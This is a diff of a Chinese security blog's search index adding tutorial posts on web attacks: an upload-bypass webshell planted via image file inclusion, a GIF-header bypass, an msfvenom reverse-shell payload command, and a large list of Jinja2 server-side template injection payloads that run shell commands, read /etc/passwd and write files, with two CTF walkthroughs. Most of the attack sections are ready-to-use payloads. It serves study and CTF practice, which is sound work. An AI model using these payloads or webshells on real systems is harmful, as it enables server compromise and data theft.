+<h4 id="2-2-9-其他绕过方式"><a href="#2-2-9-其他绕过方式" class="headerlink" title="2.2.9 其他绕过方式"></a>2.2.9 其他绕过方式</h4><p><strong>上传图片马结合文件包含</strong>：<br>很多网站通常会提供文件上传功能，比如：上传头像、文档等，这时就可以采取上传一句话图片木马的方式进行包含。<br>假设已经上传一句话图片木马到服务器，路径为&#x2F;upload&#x2F;1.jpg,图片代码如下：<br><code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php @eval($_POST[&#39;password&#39;]);?&gt;&quot;)?&gt;</code><br>然后访问URL：<code>http://www.xxxx.com/index.php?page=./upload/1.jpg</code>，包含这张图片，将会在index.php所在的目录下生成shell.php<br><br></p>
+<h3 id="2-3-基于文件内容（文件头检测）"><a href="#2-3-基于文件内容（文件头检测）" class="headerlink" title="2.3 基于文件内容（文件头检测）"></a>2.3 基于文件内容（文件头检测）</h3><p>利用每一个特定类型的文件都会有不一样的开头或者标志位进行检测。<br><strong>常见格式</strong>：<br><img src="/posts/154257042/2.png"><br><strong>绕过方法</strong>：<br>给上传脚本加上相应的幻数头字节就可以，php引擎会将GIF89a的内容当作html文本，不解释直接跳过，后面的代码仍然能够得到执行，如下：<br>（一般不限制图片文件格式的时候使用GIF的头比较方便，因为全都是文本可打印字符。）  </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a  </span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<br>
+
+
+]]></content>
+      <categories>
+        <category>web攻防</category>
+      </categories>
+      <tags>
+        <tag>web攻防</tag>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Metasploit</title>
     <url>/posts/1051313787.html</url>
     <content><![CDATA[<h2 id="Metasploit的免杀和基本使用"><a href="#Metasploit的免杀和基本使用" class="headerlink" title="Metasploit的免杀和基本使用"></a>Metasploit的免杀和基本使用</h2><p>1、在kali里打开Metasploit，创建payload，输入<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=*** lport=*** -f exe -o ***(保存的文件名字及后缀)</code></p>
@@ -223,26 +460,34 @@ clearev                                                 #清除日志
 
 <h2 id="python案例说明"><a href="#python案例说明" class="headerlink" title="python案例说明"></a>python案例说明</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask    <span class="comment"># Jinja2是Flask框架的一部分，Jinja2会把模板参数提供的相应的值替换成 &#123;&#123;…&#125;&#125; 块</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&quot;flag&#123;SSTI_123456&#125;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_found</span>(<span class="params">e</span>):</span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#123;%% block body %%&#125;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;center-content error&quot;&gt;    # 这里是报错页面所显示的内容</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;    # %s接收404_url下的参数，返回到报错页面中</span></span><br><span class="line"><span class="string">    &lt;/div&gt; </span></span><br><span class="line"><span class="string">&#123;%% endblock %%&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % (request.args.get(<span class="string">&#x27;404_url&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
 
-<p>随便输入字符使得页面报错，并利用404_url来接收参数，发现存在注入<br><img src="/posts/3320036978/1.png"></p>
+<p>随便输入字符使得页面报错，并利用404_url来接收参数，发现存在注入<br><img src="/posts/3320036978/1.png"><br><br></p>
 <p>使用<strong>payload</strong>进行注入</p>
 <figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">使用<span class="variable">__import__</span>的os。</span><br><span class="line"><span class="string">&quot;&quot;</span>.<span class="variable">__class__</span>.<span class="variable">__bases__</span>[<span class="number">0</span>].<span class="variable">__subclasses__</span>()[<span class="number">75</span>].<span class="variable">__init__</span>.<span class="variable">__globals__</span>.<span class="variable">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
 
-<p><img src="/posts/3320036978/2.png"></p>
-<br>
+<p><img src="/posts/3320036978/2.png"><br><br></p>
+<p><strong>基础类的执行</strong></p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="strong">__class__</span>  返回类型所属的对象（类）</span><br><span class="line"><span class="strong">__mro__</span>    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line"><span class="strong">__base__</span>   返回该对象所继承的基类</span><br><span class="line">// <span class="strong">__base__</span>和<span class="strong">__mro__</span>都是用来寻找基类的</span><br><span class="line"><span class="strong">__subclasses__</span>   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line"><span class="strong">__init__</span>  类的初始化方法</span><br><span class="line"><span class="strong">__globals__</span>  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>
 
-<h2 id="CTF习题"><a href="#CTF习题" class="headerlink" title="CTF习题"></a>CTF习题</h2><p>1、这里看到flask框架及渲染，猜测是ssti注入<br><img src="/posts/3320036978/3.png"></p>
-<p>2、在shrine路径下输入49验证<br><img src="/posts/3320036978/4.png"></p>
-<p>3、由于safe_jinja函数对输入的参数进行了过滤，不能直接使用<code>&#123;&#123;config&#125;&#125;</code>，但这里可以使用python内置函数url_for 或 get_flashed_messages<br><img src="/posts/3320036978/5.png"></p>
-<p>4、爆出current_app，由于flag存在app.config里<br>所以输入url_for.<strong>globals</strong>.current_app.config[‘FLAG’]，得到flag<br><img src="/posts/3320036978/6.png"></p>
-<br>
+<h2 id="SSTI漏洞利用基本流程"><a href="#SSTI漏洞利用基本流程" class="headerlink" title="SSTI漏洞利用基本流程"></a>SSTI漏洞利用基本流程</h2><p>获取当前类 -&gt; 获取其object基类 -&gt; 获取所有子类 -&gt; 获取可执行shell命令的子类 -&gt; 获取可执行shell命令的方法 -&gt; 执行shell命令</p>
+<h2 id="常用payload-无过滤情况"><a href="#常用payload-无过滤情况" class="headerlink" title="常用payload(无过滤情况)"></a>常用payload(无过滤情况)</h2><figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">#读取文件类，<span class="tag">&lt;<span class="name">type</span> ‘<span class="attr">file</span>’&gt;</span> file位置一般为40，直接调用</span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[40](<span class="name">&#x27;flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> </span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__bases__</span>[0].__subclasses__()[40](<span class="name">&#x27;etc/passwd&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__bases__</span>[0].__subclasses__()[40](<span class="name">&#x27;etc/passwd&#x27;</span>).readlines()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[257](<span class="name">&#x27;flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> (python3)</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">#直接使用popen命令，python2是非法的，只限于python3</span></span><br><span class="line"><span class="language-xml">os._wrap_close 类里有popen</span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[128].__init__.__globals__[&#x27;popen&#x27;](<span class="name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[128].__init__.__globals__.popen(<span class="name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">#调用os的popen执行命令</span></span><br><span class="line"><span class="language-xml">#python2、python3通用</span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[71].__init__.__globals__[&#x27;os&#x27;].popen(<span class="name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[71].__init__.__globals__[&#x27;os&#x27;].popen(<span class="name">&#x27;ls /flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[71].__init__.__globals__[&#x27;os&#x27;].popen(<span class="name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[185].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](<span class="name">&#x27;os&#x27;</span>).popen(<span class="name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__(<span class="name">&#x27;os&#x27;</span>).popen(<span class="name">&#x27;id&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[250].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](<span class="name">&#x27;os&#x27;</span>).popen(<span class="name">&#x27;id&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[250].__init__.__globals__[&#x27;os&#x27;].popen(<span class="name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">#python3专属</span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[75].__init__.__globals__.__import__(<span class="name">&#x27;os&#x27;</span>).popen(<span class="name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[128].__init__.__globals__[&#x27;os&#x27;].popen(<span class="name">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">#调用eval函数读取</span></span><br><span class="line"><span class="language-xml">#python2</span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"> </span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__mro__</span>[-1].__subclasses__()[60].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="name">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__mro__</span>[-1].__subclasses__()[61].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="name">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__mro__</span>[-1].__subclasses__()[29].__call__(<span class="name">eval</span>,<span class="string">&#x27;os.system(&quot;ls&quot;)&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">#python3</span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;()<span class="name">.__class__.__bases__</span>[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#x27;eval&#x27;](<span class="name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"> </span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;]&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__mro__</span>[-1].__subclasses__()[117].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[250].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval(<span class="name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[128].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="name">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">#调用 importlib类</span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[128][&quot;load_module&quot;](<span class="name">&quot;os&quot;</span>)[&quot;popen&quot;](<span class="name">&quot;ls /&quot;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">#调用linecache函数</span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[128].__init__.__globals__[&#x27;linecache&#x27;][&#x27;os&#x27;].popen(<span class="name">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[59].__init__.__globals__[&#x27;linecache&#x27;][&#x27;os&#x27;].popen(<span class="name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[168].__init__.__globals__.linecache.os.popen(<span class="name">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">#调用communicate()函数</span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[128](<span class="name">&#x27;whoami&#x27;</span>,<span class="attr">shell</span>=<span class="literal">True</span>,<span class="attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">#写文件</span></span><br><span class="line"><span class="language-xml">写文件的话就直接把上面的构造里的read()换成write()即可，下面举例利用file类将数据写入文件。</span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__bases__</span>[0].__bases__[0].__subclasses__()[40](<span class="name">&#x27;/tmp&#x27;</span>).write(<span class="name">&#x27;test&#x27;</span>)&#125;&#125;</span><span class="language-xml">  ----python2的str类型不直接从属于基类，所以payload中含有两个 .__bases__</span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;file&#x27;](<span class="name">&#x27;/etc/passwd&#x27;</span>).write(<span class="name">&#x27;123456&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">#通用 getshell</span></span><br><span class="line"><span class="language-xml">原理：找到含有 __builtins__ 的类，利用即可。</span></span><br><span class="line"><span class="language-xml">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="template-variable">&#123;&#123; <span class="name">c.__init__.__globals__</span>[&#x27;__builtins__&#x27;].eval(<span class="name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>) &#125;&#125;</span><span class="language-xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span></span><br><span class="line"><span class="language-xml">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="template-variable">&#123;&#123; <span class="name">c.__init__.__globals__</span>[&#x27;__builtins__&#x27;].open(<span class="name">&#x27;filename&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="language-xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">**参考文章**：https://blog.csdn.net/2301_77485708/article/details/132467976</span></span><br></pre></td></tr></table></figure>
 
-<p>所以在开发Web应用程序时，始终要警惕并避免直接使用用户输入构造动态内容，尤其是在模板渲染过程中。对用户输入进行严格的验证和过滤，以及遵循最佳的安全实践，是保护系统免受SSTI等安全威胁的关键。</p>
+<h2 id="CTF习题-1-—BUUCTF-shrine1"><a href="#CTF习题-1-—BUUCTF-shrine1" class="headerlink" title="CTF习题(1)—BUUCTF shrine1"></a>CTF习题(1)—BUUCTF shrine1</h2><p>1、这里看到flask框架及渲染，猜测是ssti注入<br><img src="/posts/3320036978/3.png"><br><br></p>
+<p>2、在shrine路径下输入49验证<br><img src="/posts/3320036978/4.png"><br><br></p>
+<p>3、由于safe_jinja函数对输入的参数进行了过滤，不能直接使用<code>&#123;&#123;config&#125;&#125;</code>，但这里可以使用python内置函数url_for 或 get_flashed_messages<br><img src="/posts/3320036978/5.png"><br><br></p>
+<p>4、爆出current_app，由于flag存在app.config里<br>所以输入url_for.<strong>globals</strong>.current_app.config[‘FLAG’]，得到flag<br><img src="/posts/3320036978/6.png"><br><br></p>
+<h2 id="CTF习题-2-—攻防世界-Web-python-template-injection"><a href="#CTF习题-2-—攻防世界-Web-python-template-injection" class="headerlink" title="CTF习题(2)—攻防世界 Web_python_template_injection"></a>CTF习题(2)—攻防世界 Web_python_template_injection</h2><p>1、打开网站有提示是python模板注入，随便输入字符使网站出错，发现有SSTI注入<br><img src="/posts/3320036978/7.png"></p>
+<p><img src="/posts/3320036978/8.png"><br><br></p>
+<p>2、输入<code>&#123;&#123;().__class__.__base__.__subclasses__()&#125;&#125;</code>获取所有类<br><img src="/posts/3320036978/9.png"><br><br></p>
+<p>3、读取文件类，&lt;type ‘file’&gt; file位置一般为40,<br>输入<code>&#123;&#123;().__class__.__base__.__subclasses__()[40]('fl4g').read()&#125;&#125;</code>获取flag<br><img src="/posts/3320036978/10.png"><br><br></p>
+<br>
+所以在开发Web应用程序时，始终要警惕并避免直接使用用户输入构造动态内容，尤其是在模板渲染过程中。对用户输入进行严格的验证和过滤，以及遵循最佳的安全实践，是保护系统免受SSTI等安全威胁的关键。
 ]]></content>
       <categories>
         <category>web攻防</category>
       </categories>
       <tags>
         <tag>web攻防</tag>
+        <tag>web漏洞</tag>
         <tag>注入</tag>
       </tags>
   </entry>
